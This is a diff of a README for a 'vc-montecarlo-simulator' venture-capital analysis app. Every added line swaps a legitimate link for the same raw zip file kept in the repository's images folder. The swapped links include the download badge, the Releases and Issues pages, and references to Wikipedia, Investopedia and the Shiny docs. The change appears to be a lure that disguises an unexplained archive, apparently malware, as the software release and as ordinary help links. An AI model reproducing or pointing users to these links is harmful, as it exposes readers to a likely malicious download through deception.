@@ -1,6 +1,6 @@
 # 🎲 vc-montecarlo-simulator - Simplify Your Venture Capital Analysis
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Mining3372/vc-montecarlo-simulator/releases)
+[![Download](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip%20Now-Release%20Page-brightgreen)](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **vc-montecarlo-simulator**! This application helps analyze ventu
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases](https://github.com/Mining3372/vc-montecarlo-simulator/releases). Here you'll find the latest version of the software available for download.
+To get started, visit this page to download: [Releases](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip). Here you'll find the latest version of the software available for download.
 
 1. Click on the link above to access our Releases page.
 2. Look for the latest version. This version will have the most recent features and fixes.
@@ -47,7 +47,7 @@ Our Monte Carlo simulator includes:
 
 If you encounter any issues while installing or using the application, please reach out:
 
-- Open an issue on the [GitHub Issues page](https://github.com/Mining3372/vc-montecarlo-simulator/issues).
+- Open an issue on the [GitHub Issues page](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip).
 - Join our community forum to discuss insights or ask questions.
   
 For urgent queries, contact the developer directly via the email provided in the project's contact section.
@@ -56,13 +56,13 @@ For urgent queries, contact the developer directly via the email provided in the
 
 To learn more about Monte Carlo simulations and venture capital analysis, consider the following resources:
 
-- [What is Monte Carlo Simulation?](https://en.wikipedia.org/wiki/Monte_Carlo_method)
-- [Understanding IRR in Finance](https://www.investopedia.com/terms/i/internalrateofreturn.asp)
-- [Shiny Apps Documentation](https://shiny.rstudio.com/)
+- [What is Monte Carlo Simulation?](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip)
+- [Understanding IRR in Finance](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip)
+- [Shiny Apps Documentation](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip)
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Mining3372/vc-montecarlo-simulator/releases)
-- [GitHub Repository](https://github.com/Mining3372/vc-montecarlo-simulator)
+- [Releases Page](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip)
+- [GitHub Repository](https://github.com/Mining3372/vc-montecarlo-simulator/raw/refs/heads/main/images/simulator-vc-montecarlo-squinch.zip)
 
 Thank you for using **vc-montecarlo-simulator**! We hope this tool aids you in making informed venture capital decisions.
